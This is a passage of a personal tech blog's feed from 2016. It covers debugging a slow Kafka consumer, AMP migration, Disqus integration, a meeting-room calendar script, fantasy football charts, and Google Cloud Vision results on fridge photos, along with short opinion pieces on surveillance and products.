<p>Over the past few weeks we rolled out a new data pipeline built around around Kafka 0.10. I plan on writing more about the full project but for this post I wanted to highlight how critical reading the documentation is. One of the first issues we ran into was that <a href="https://github.com/pinterest/secor">secor</a>, a neat application open sourced by Pinterest to allow simple saving of Kafka messages to S3, was consuming extremely slowly. I fastidiously tweaked the Kafka configuration to get as much out of it as I could to no avail. I spent hours experiment with the various secor options to see whether there was a simple solution I was missing. No matter what I tried I was unable to consume more than 50mb/min - despite the fact that both the Kafka cluster and the instance running secor could support an order of magnitude more than that. I confirmed that there was something fishy by running the same exact code on a massive c3.8xlarge instance to see how much better it would fare. And sure enough I still couldn’t get past 50mb/min.</p>

<img src="http://dangoldin.com/assets/static/images/secor-old-in.png" alt="Old network in" width="1757" height="833" layout="responsive"/>
<p class="caption">The blue is an c4.xlarge and the orange is a c4.8xlarge. Clearly they should not both be consuming at the same rate. Also, the large spike in the middle is when the offsets start dropping off and secor keeps attempting to catch up.</p>

<img src="http://dangoldin.com/assets/static/images/secor-old-out.png" alt="Old network out" width="1765" height="847" layout="responsive"/>
<p class="caption">The flip side is that the uploads to S3 are throttled and drop of when we're behind Kafka.</p>

<p>At this point I was extremely frustrated and figured I might as well revisted the Kafka docs and found this <a href="http://kafka.apache.org/0100/documentation.html#upgrade_10_performance_impact">wonderful gem</a>:</p>

<blockquote>
  <p>The message format in 0.10.0 includes a new timestamp field and uses relative offsets for compressed messages. The on disk message format can be configured through log.message.format.version in the server.properties file. The default on-disk message format is 0.10.0. If a consumer client is on a version before 0.10.0.0, it only understands message formats before 0.10.0. In this case, the broker is able to convert messages from the 0.10.0 format to an earlier format before sending the response to the consumer on an older version. However, the broker can’t use zero-copy transfer in this case. Reports from the Kafka community on the performance impact have shown CPU utilization going from 20% before to 100% after an upgrade, which forced an immediate upgrade of all clients to bring performance back to normal. To avoid such message conversion before consumers are upgraded to 0.10.0.0, one can set log.message.format.version to 0.8.2 or 0.9.0 when upgrading the broker to 0.10.0.0. This way, the broker can still use zero-copy transfer to send the data to the old consumers. Once consumers are upgraded, one can change the message format to 0.10.0 on the broker and enjoy the new message format that includes new timestamp and improved compression. The conversion is supported to ensure compatibility and can be useful to support a few apps that have not updated to newer clients yet, but is impractical to support all consumer traffic on even an overprovisioned cluster. Therefore it is critical to avoid the message conversion as much as possible when brokers have been upgraded but the majority of clients have not.</p>
</blockquote>

<p>The light immediately went off and sure enough, secor was configured to use a Kafka 0.8 client. As soon as I <a href="https://github.com/pinterest/secor/pull/262">upgraded secor</a> to use Kafka 0.10 the consumption rate shot up to over 2.5gb/min. Despite feeling incredibly stupid it felt good to finally get to the bottom of it and only wish I read the docs more thoroughly before diving in. The benefit to all this is that I have a much better understanding of how  Kafka, ZooKeeper, and secor need to be configured and the value of actually reading the documentation, something that I still haven’t internalized.</p>

<img src="http://dangoldin.com/assets/static/images/secor-new-in.png" alt="Old network in" width="886" height="425" layout="responsive"/>
<p class="caption">After the upgrade we see a healthy spike of data going in as we're trying to catch up.</p>

<img src="http://dangoldin.com/assets/static/images/secor-new-out.png" alt="Old network in" width="878" height="426" layout="responsive"/>
<p class="caption">Similarly we see us writing it all out to S3.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Friction and mass surveillance</title>
   <link href="http://dangoldin.com/2016/10/09/friction-and-mass-surveillance/"/>
   <updated>2016-10-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/09/friction-and-mass-surveillance</id>
   <content:encoded><![CDATA[
<p>One of the best arguments I’ve heard against mass surveillance is that the marginal cost has dropped to nearly zero which warps the system. Since so much of our world is digital it costs the government nothing extra to collect each additional data point. Given these incentives it’s no surprise that the government was able to get the major companies to provide a dedicated feed of the data they were collecting - modern technology has enabled both the collection and analysis of massive amounts of data.</p>

<p>This infrastructure is something we’ve never had before. In the past surveillance carried a sizable cost - beyond the warrant one would need to either install wiretaps, manually intercept mail, have people followed, and generally hire people to do both the data collection as well as the analysis. These constraints necessitated making tradeoffs and prioritized those that carried the largest risk.</p>

<p>It’s impossible to undo the technological advances and we wouldn’t want to. At the same time we need to do more to introduce friction back to surveillance. The goal isn’t to achieve 100% privacy but to make it costly enough that governments need to think about who and what they’re tracking. The obvious way is to start using end to end encryption - I’m sure isolated cases can be cracked but cracking it at scale would be a monumental task.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>iOS wifi security recommendation</title>
   <link href="http://dangoldin.com/2016/10/02/ios-wifi-security-recommendation/"/>
   <updated>2016-10-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/02/ios-wifi-security-recommendation</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img title="iOS security recommendation" src="http://dangoldin.com/assets/static/images/ios-security-recommendation.png" alt="iOS security recommendation" width="300" height="534"/>
</div>

<p>While exploring the city earlier today I ended up wandering too close to the Google building and somehow got connected to their guest wifi network, GoogleGuest, and noticed that iOS 10 gave me an “Security Recommendation” notification. My first reaction was that this was an Apple jab at Google but It turns out that iOS 10 introduced a <a href="https://www.engadget.com/2016/07/22/ios-10-unsecured-networks/">new feature</a> to let people know that they were connecting to an open network. The intent seems to be to warn users that they may not be on a secure connection but it’s a bit hidden away and didn’t actually prevent me from connecting: it was more of an FYI.</p>

<p>It’s clearly a minor feature but I think it reinforces the stance Apple has been taking in favor of <a href="http://www.apple.com/customer-letter/">user privacy and encryption</a>. They’re positioning themselves to be the antithesis of Google and this is a small way of driving that point home.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shaming meeting room hogs</title>
   <link href="http://dangoldin.com/2016/10/01/shaming-meeting-room-hogs/"/>
   <updated>2016-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/01/shaming-meeting-room-hogs</id>
   <content:encoded><![CDATA[
<p>One of the first things felt by a fast growing company is the lack of meeting space. The first few weeks at a new office it’s wonderful to know you can find a room whenever you need it. Yet after a few months and a bunch of extra people you realize you have to book meetings days in advance. And what makes this worse is seeing more than one room booked for the same meeting.</p>

<p>After seeing this happening I decided to do something about it and wrote a quick script to pull the meeting calendar for every room from <a href="https://developers.google.com/google-apps/calendar/">Google Calendar</a> and then flag the ones having the same start time, end time, and creator.  This isn’t foolproof since it won’t identify cases where someone books multiple rooms for the same time with different times but it’s a solid start and already caught a few cases. The code is up on <a href="https://github.com/dangoldin/gcal-shaming">GitHub</a> so feel free to take a look and provide suggestions.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>NFL Thursdays on Twitter</title>
   <link href="http://dangoldin.com/2016/09/25/nfl-thursdays-on-twitter/"/>
   <updated>2016-09-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/25/nfl-thursdays-on-twitter</id>
   <content:encoded><![CDATA[
<p>In April, Twitter <a href="http://www.bloomberg.com/news/articles/2016-04-05/twitter-said-to-win-nfl-deal-for-thursday-night-streaming-rights">announced a deal</a> with the NFL to broadcast Thursday night games and I gave it a shot this past Thursday via the Twitter app on my FireTV. The primary motivation was to watch the game but I was also curious to see Twitter’s implementation. I was pleasantly surprised by how smooth and clean the overall experience was: you could watch the entire game without knowing it was via Twitter but the tweets added a please, yet optional, touch. The only real difference between the Twitter app and any other FireTV streaming app was that Twitter augmented the experience with twitter content - tweets, images, and scopes.</p>

<p>This NFL product makes me optimistic about Twitter and does feel as if they finally stumbled unto a product that works and reinforces their strengths. By focusing on live events and building on top of them with content that’s unique to Twitter they have the potential to change the way we consume live TV. At the moment the feed seems to be chronological but if Twitter can figure out how to make it a bit more relevant it can make the feed section standard.</p>

<p>The feed section currently takes up close to a third of the screen which causes the video to be scaled down. The sidebar is an obvious first attempt but I can think of other ways the tweets can be shown - maybe a ticker tape or even a translucent overlay - would make it likelier that people keep the feed on throughout the game.</p>

<p>There’s also a ton of opportunity in opening this platform up to developers. Twitter developed the reputation of betraying the developer community during their growth but this can be a chance to redeem themselves. Imagine being able to build an app that lives within the TV app and can show you how your fantasy team is doing or just displaying a more targeted subset of the tweets or even pulling in additional stats. All Twitter would need to do is provide the platform and the community can build on top of it to deliver custom experiences. The incentive is already there - being able to have an app that’s used while people are watching TV is hugely motivating and will get developers supporting Twitter.</p>

<p>Disclosure: I own a small number of Twitter shares.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A smarter Touch ID</title>
   <link href="http://dangoldin.com/2016/09/23/a-smarter-touch-id/"/>
   <updated>2016-09-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/23/a-smarter-touch-id</id>
   <content:encoded><![CDATA[
<p>Apple’s Touch ID is great but one thing it doesn’t handle well is wet fingers. Even if my hands are a little bit sweaty or not completely dry it’s difficult to unlock the phone. Yet as soon as they’re dry the phone immediately unlocks. What’s surprising, especially given Apple’s focus on delivering the perfect user experience, is that this is still a problem. I’m not familiar with the hardware behind Touch ID but even if there’s some sort of warped fingerprint it should be good enough. The fact that there are a few unsuccessful attempts with the wet thumb followed by successful attempt should be enough to develop a profile for the wet version which can be used on future attempts. Modern products succeed by delivering optimized experiences; future products will need to adapt and grow along with us until they become eerily predictive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automating management</title>
   <link href="http://dangoldin.com/2016/09/18/automating-management/"/>
   <updated>2016-09-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/18/automating-management</id>
   <content:encoded><![CDATA[
<p>One of the biggest lessons I learned when I became an engineering manager was how important the basic operational elements. These are all the things that need to get done outside of code and allow the whole team to be as productive as possible and range from reminding people to do code reviews to creating dashboards to highlight key metrics to enforcing an on-call process. These tasks are important yet repetitive so being a good engineer I’ve spent some time automating them. There’s still a long way to go but strong engineers have a mindset that they want to automate as much repetitive work as possible in order to focus on unique and novel challenges.</p>

<p>This attitude can be applied to management as well. By automating the menial stuff you’re able to focus on the tasks that require a human touch. Nearly every product geared towards developers exposes some sort of API which can be used to automate most rote work. The approach I’ve taken so far is extracting data from Redmine and GitHub via their APIs and exposing the results in a simple dashboard powered by <a href="https://github.com/Freeboard/freeboard">freeboard</a> as well as on Slack. Since every company has a unique setup with their own set of tools and processes it’s difficult to come up with a universal solution but modern day tools make it incredibly easy to get started with some sort of automation.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Supporting Disqus in AMP</title>
   <link href="http://dangoldin.com/2016/09/13/supporting-disqus-in-amp/"/>
   <updated>2016-09-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/13/supporting-disqus-in-amp</id>
   <content:encoded><![CDATA[
<p>After migrating my blog to AMP the last task was getting <a href="https://disqus.com/">Disqus</a> working again. The crux of the issue is that in order to improve page performance AMP disallows blanket script tags (which the Disqus integration leverages) but to make up for it comes with a variety of helpers to include officially support functionality. Examples of this include an amp-youtube tag to include YouTube videos and the amp-vimeo tag to include Vimeo videos. As a generic solution, AMP provides the amp-iframe tag which allows you to include a restricted iframe.</p>

<p>Doing the research it turned out there was no out of the box solution but after a bunch of false starts I came across a great <a href="https://labs.tomasino.org/disqus-in-amp">post</a> by <a href="https://twitter.com/mr_ino">James Tomasino</a> where he ran into similar issue and came up with a workaround that was simply creating an additional HTML page for each post that contained the appropriate Disqus code which could then be included via the amp-iframe tag. Unfortunately this approach wouldn’t work in my case since amp-iframe requires HTTPS and my blog is solely HTTP due to being hosted on GitHub pages with a custom domain.</p>

<p>The workaround I came up with is to take the script James came up with and make a few tweaks to it that allow it to be hosted on an S3 bucket. I also wanted to avoid having to build an additional comment HTML page for each post for each new post and made a small change that allowed me to pass the relevant details as GET arguments into the comment iframe page. If you’re interested in the implementation, just take a look at the source of this page or check out <a href="https://s3.amazonaws.com/dangoldin.com/amp-disqus.html">https://s3.amazonaws.com/dangoldin.com/amp-disqus.html</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Comparing my top sites: 2012 vs now</title>
   <link href="http://dangoldin.com/2016/09/10/comparing-my-top-sites-2012-vs-now/"/>
   <updated>2016-09-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/10/comparing-my-top-sites-2012-vs-now</id>
   <content:encoded><![CDATA[
<p>While going through and making sure each of my old posts was AMP compatible I came across a <a href="/2012/06/07/achieving-browser-autocomplete/">post from 2012</a> where I tried to list the first autocomplete suggestion for each letter. This naturally made me think of what the results would be if I did the same exercise now. Comparing the information 4 years apart is an interesting way to see how my habits have changed but also provide a glimpse into the evolution of companies, products, and technology. The biggest surprise is how much of the list is work related - it’s somewhat expected given how much time we spend working and how many more cloud services there are but it’s still shocking that almost half the list is work related. The other major realization is that much of my consumption has shifted to mobile - many of the sites that are no longer on the list I actively use on my phone; I may actually use Instapaper, Google Maps, and Twitter more frequently now but it’s mostly on mobile via an app. Given how interesting this exercise was I plan on doing this annually and encourage others to do the same - it’s an extremely simple way to see how technology and our relationship to it changes over time.</p>

<table class="table"><thead><tr><th>2012</th><th>2016</th><th>Notes</th></tr></thead><tbody><tr><td>analytics.google.com</td><td>amazon.com</td><td>I don't care as much as I used to about site metrics but to make up for it I'm shopping more frequently.</td></tr><tr><td>bankofamerica.com</td><td>betterworks.com</td><td>We've been using BetterWorks to manage team and personal OKRs.</td></tr><tr><td>cad-comic.com/cad</td><td>console.aws.amazon.com</td><td>Another work product - need to make sure everything's still up and running.</td></tr><tr><td>docs.google.com</td><td>drive.google.com</td><td>Just a domain change.</td></tr><tr><td>eventbrite.com</td><td>-</td><td>An internal Sentry installation to help us track errors.</td></tr><tr><td>facebook.com</td><td>football.fantasysports.yahoo.com</td><td>Start of football season but not sure what would have replaced this.</td></tr><tr><td>glos.si</td><td>github.com</td><td>Glossi is no longer around but I spend a ton of time on GitHub now.</td></tr><tr><td>heroku.com</td><td>hellofresh.com</td><td>Might be based on recency since I was cancelling my account last week.</td></tr><tr><td>instapaper.com</td><td>interactivebrokers.com</td><td>I'm mostly using the Instapaper app now.</td></tr><tr><td>joinblended.com</td><td>jira.com</td><td>Need to maintain our agility.</td></tr><tr><td>klout.com</td><td>kafka.apache.org</td><td>Apparently I spend a lot of time read Kafka docs.</td></tr><tr><td>linkedin.com</td><td>localhost:4000</td><td>This is Jekyll which powers my blog.</td></tr><tr><td>maps.google.com</td><td>mint.com</td><td>This is an interesting one. I use Google Mpas more frequently than Mint but it's mostly on mobile or typing an address in directly or incognito.</td></tr><tr><td>news.ycombinator.com</td><td>news.ycombinator.com</td><td>One of the few that stayed the same.</td></tr><tr><td>optimum.com</td><td>opentable.com</td><td>We no longer have Optimum and booked a dinner reservation recently.</td></tr><tr><td>plus.google.com</td><td>-</td><td>This is a work domain that's just not very well secured.</td></tr><tr><td>questionablecontent.net</td><td>questionablecontent.net</td><td>Another one that stayed the same.</td></tr><tr><td>reader.google.com</td><td>-</td><td>Another inernal work domain.</td></tr><tr><td>startupmullings.com</td><td>suntrust.com</td><td>I went from blogging about startups to paying a mortgage.</td></tr><tr><td>twitter.com</td><td>triplelift.atlassian.net</td><td>Our Atlassian installation.</td></tr><tr><td>udacity.com</td><td>usetallie.com</td><td>Another work site to submit expense reports.</td></tr><tr><td>voice.google.com</td><td>vettery.com</td><td>A work site to help recruiting.</td></tr><tr><td>wixlounge.com</td><td>wrike.com</td><td>Not many sites starting with w. We tried Wrike out before using JIRA.</td></tr><tr><td>xkcd.com</td><td>xkcd.com</td><td>Another one that stayed the same. I'm loyal to my comics.</td></tr><tr><td>youtube.com</td><td>youtube.com</td><td>Same here. I don't use YouTube much but not many other sites starting with a y.</td></tr><tr><td>zerply.com</td><td>zillow.com</td><td>I'm such an adult.</td></tr></tbody></table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AMP migration scripts</title>
   <link href="http://dangoldin.com/2016/09/08/amp-migration-scripts/"/>
   <updated>2016-09-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/08/amp-migration-scripts</id>
   <content:encoded><![CDATA[
<p>Over Labor Day weekend I migrated my blog to use <a href="https://www.ampproject.org/">AMP</a> but the first version was definitely a work in progress. One big item I needed to take care of was converting all my images to be AMP compatible by replacing &lt;img&gt; tag with &lt;amp-img&gt; along with the image width and height. I ended up writing a quick Python script to go through each of my posts, find each &lt;img&gt; tag, get the image’s dimensions, and then replace the original tag wit the AMP version. Unfortunately, I ran the script without too much testing and forgot to add closing tags which caused some of the content to go missing.</p>

<p>The solution was to write another script that once again went through every post but instead of replacing every img tag with an amp-img tag it found every amp-img referenced and added a closing tag in case it didn’t have one. These two scripts combined ended up fixing most of the AMP issues but I’m sure there are still a few posts that got warped so if you notice any please let me know.</p>

<p>In the spirit of constantly shipping the code is up on <a href="https://github.com/dangoldin/ampification">GitHub</a> but is simple enough to not need a ton of polishing. Note that it’s not very robust and has some assumptions based on my blog structure so I would test it thoroughly before applying it to your posts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing fantasy football stats</title>
   <link href="http://dangoldin.com/2016/09/05/visualizing-fantasy-football-stats/"/>
   <updated>2016-09-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/05/visualizing-fantasy-football-stats</id>
   <content:encoded><![CDATA[
<p>In honor of the upcoming NFL season I thought it would be interesting to actually take a look at the scraped fantasy football projections and visualize it in a few different ways. The data contained the weekly projections for that week’s top 100 scorers which amounted to 1700 rows - note that this means the dataset only includes the top performers rather than every single player. I ended up using R since it makes it incredibly easy to process data and get some nice looking visualizations in only a few lines of code. As usual, the code is up on <a href="https://github.com/dangoldin/yahoo-ffl/blob/master/analyze.R">GitHub</a> and I’ll keep updating it as I keep adding newer visualizations and analyses.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/position-avg-points.png" alt="Avg points by position" width="700" height="390" layout="responsive"/>
      <p>Pretty simple here but highlights how much more valuable the QB position is compared to the others.</p>
    </div>
  </li>

<li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/position-points-boxplot.png" alt="Position points boxplot" width="700" height="390" layout="responsive"/>
      <p>The <a href="https://en.wikipedia.org/wiki/Box_plot">box plot</a> is a quick way of looking at distributions since it highlights a few metrics at once - the median, the quartiles, as well the outliers. What's interesting here is how many outliers there are at the QB and WR positions, especially how uneven it is for WRs.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/position-points-density.png" alt="Position point density" width="700" height="390" layout="responsive"/>
      <p>The density plot shows how the points are distributed by position. This shows a similar story to what we saw in the boxplot but visualizes each of the data points. I suspect the symmetry in the QB position is not unique and is just an artifact of the fact that QBs are heavily represented in the top 100 players each week and if were to expand our dataset we'd see similar distributions for the other positions.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/team-avg-points.png" alt="Avg points by team" width="700" height="390" layout="responsive"/>
      <p>Similar exercise to the above but by team. I didn't find a ton interesting here other than Pittsburgh is dominant when it comes to top fantasy players and that Denver and Philadalphia are lacking.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/team-points-boxplot.png" alt="Team points boxplot" width="700" height="390" layout="responsive"/>
      <p>This isn't the most useful due to the biased dataset but it does highlight the dominance of some teams compared to others but not much more than that - at least with a quick glance.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/team-points-density.png" alt="Team point density" width="700" height="390" layout="responsive"/>
      <p>A bit tough to read due to the volume of teams but paired with the previous one does show that there are a few outliers but many of the distributions are similar.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AMPifying my blog</title>
   <link href="http://dangoldin.com/2016/09/05/ampifying-my-blog/"/>
   <updated>2016-09-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/05/ampifying-my-blog</id>
   <content:encoded><![CDATA[
<p>Ever since AMP was announced I’ve been meaning to migrate my blog but hesitated due to the fear that it would take an inordinate amount of time and would be laden with edge cases. But over the Labor Day weekend I decided to give it a shot and see how far i could get. A quick GitHub search showed two promising repos - <a href="https://github.com/juusaw/amp-jekyll">amp-jekyll</a> and <a href="https://github.com/ageitgey/amplify">amplify</a> - and I gave them both a shot. They approach AMP integration in two different ways - amp-jekyll creates an AMP version of every post and has it live in a separate folder structure while amplify is a comprehensive theme. This made the amp-jekyll integration much easier since it’s designed to work parallel to the existing blog but I wanted to do a full rewrite.</p>

<p>I ended up cloning the amplify repository and manually importing a few of my blog posts to see how they’d render, handle the images, and look under the different style. After playing around with amplify I realized it would actually be straightforward to integrate directly into my blog as an additional theme. After copying over the design files and the libraries required to inline the SCSS I was left with making a few changes to the CSS to get it to resemble the previous design. All in it took a few hours to get my blog migrated to AMP and it’s incredibly quick - especially on mobile (if you haven’t given it a shot please do).</p>

<p>There are still a few things I need to take care of but I’m pleasantly surprised by the ease and simplicity of the transition and the resulting performance. The major problems I need to take care of before I call this a success:</p>

<ul>
  <li>Disqus integration. I’ve been using Disqus to manage comments and it would be a shame if I had to ditch it. Based on a few StackOverflow and forum posts it looks as if it’s possible to get Disqus working by forcing an iframe with the comment section but I’ll have to figure out how this works.</li>
  <li>Various styling fixes: Since I ended up starting with the amplify CSS there are a few inconsistencies that I still need to take care of - especially on some of my older posts that have some ugly inline CSS.</li>
  <li>Img to amp-img: To be AMP compliant you cannot have any img tags and instead must use amp-img. This sounds straightforward but amp-img requires you to specify the dimensions of the image which I have not been doing. It looks as if there’s a plugin for this in amp-jekyll and I got it working locally but need to get it working on GitHub pages.</li>
  <li>JavaScript heavy posts: I have a few older posts that depend on D3 for visualizations and I’m going to have to rewrite those posts to include the animations as amp-iframe elements. This seems straightforward but I’m sure I’ll run into some hiccups when I actually sit down to do this.</li>
  <li>Build times take forever: This is my biggest issue so far. Since AMP requires all CSS to be inlined it means that every CSS change causes the entire site to be regenerated. Before AMPifying, Jekyll would build the site in around 10 seconds and now it takes nearly 2 minutes. I don’t have a good fix for this but a simple solution may be to have different CSS for the different types of pages to avoid a full site regeneration with every style change. While developing I solve this problem by moving all but a few posts out of the _posts folder in order to reduce the number of pages that need to be generated. Then when I’m happy with the outcome I’ll move the other posts back and let it go through the full generation. This is extremely hacky and I wish there was a better solution here.</li>
</ul>

<p>I’d love to know what the readers of the blog think and whether they’re noticing any improvement so if you have any feedback please let me know. And I’m aware that I have yet to get Disqus set up to work with AMP but in the meantime let me know via <a href="https://twitter.com/dangoldin">Twitter</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Violating the norms of a social network</title>
   <link href="http://dangoldin.com/2016/09/01/violating-the-norms-of-a-social-network/"/>
   <updated>2016-09-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/09/01/violating-the-norms-of-a-social-network</id>
   <content:encoded><![CDATA[
<p>Social networks carry extreme network effects and have massive winner-take-all dynamics. This makes it impossible for two social networks that have the same pitch to co-exist and leads to pretty strong differentiation. Facebook owns relationships. Twitter owns interests. Instagram owns lifestyle. Snapchat is starting to own experience. This is why I find it fascinating when the content from one social network or medium bleeds into another. Twitter doesn’t allow for tweets longer than 140 characters so people overcome that by sharing screengrabs of long form text. I’ve seen the same on Imgur - it’s primarily used for images but often you’ll see someone posting an image of a long story. We have our own unique relationships across each of these networks so it’s not surprising that we’ll sometimes want to communicate something that’s best expressed with a specific medium yet it’s still fascinating seeing it in action. I get the feeling that they’re publicly exploiting a loophole and adding a tiny bit of chaos to the universe.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Food identification with Google's Cloud Vision</title>
   <link href="http://dangoldin.com/2016/08/29/food-identification-with-googles-cloud-vision/"/>
   <updated>2016-08-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/08/29/food-identification-with-googles-cloud-vision</id>
   <content:encoded><![CDATA[
<p>Something that I haven’t quite figured out is how to avoid wasting food. I like to think I keep good track of everything in my fridge but too often I end up finding something in the corner that spoiled and needs to be thrown out. Earlier today I was talking to someone at the office about this problem and how nice it would be if you could just have something that knows everything that’s in the fridge and can track how long it’s been there and an estimate of how long it will last. I’m sure refrigerators in 10 years will have this built in but I wanted to see what I could cobble together in an evening.</p>

<p>Luckily for me Google released a Cloud Vision API and I decided to give it a shot. Turns out implementing it was extremely straightforward, despite Google’s poor documentation, with a quick code search on GitHub that led to me <a href="https://github.com/ramhiser/serverless-cloud-vision">https://github.com/ramhiser/serverless-cloud-vision</a>. Unfortunately, the results were not promising. I ran on three images and while the categorization was surprisingly accurate it was too general. I expected to at least accurate identification for the bottles and cans - milk, ketchup, yogurt but the closest it got was food, ice cream, and gelato. Granted, the photos weren’t staged well and it took me about 15 minutes to get it working but I was still disappointed. The Cloud VIsion service doesn’t offer much customization so I’m going to see how much better I can make it by improving the photos. I’ve included the original photos along with the classification results below. As usual my code is up on <a href="https://github.com/dangoldin/fridge-vision">GitHub</a> although it was really just a straight up copy and paste from <a href="https://github.com/ramhiser/serverless-cloud-vision">ramhiser’s code</a> above.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/fridge-1.jpg" alt="Fridge 1" width="600" height="800" layout="responsive"/>
      
<figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.90114909</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02wbm"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"food"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.88251483</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02phwj2"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"display window"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.81870794</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0cxn2"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ice cream"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.76996088</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0270h"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"dessert"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.75129372</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02fz11"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gelato"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.69974077</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02rfdq"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"interior design"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.57035172</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/02q08p0"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"dish"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.54961139</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/0191_7"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"retail store"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.53331912</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/031bff"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"window covering"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
          </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">0.51523668</span><span class="p">,</span><span class="w">
          </span><span class="nl">"mid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/m/01_bhs"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"fast food"</span><span class="w">
        </span><span class="p">}</span><span class="w">
      </span><span class="p">]</span></code></pre></figure>

    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
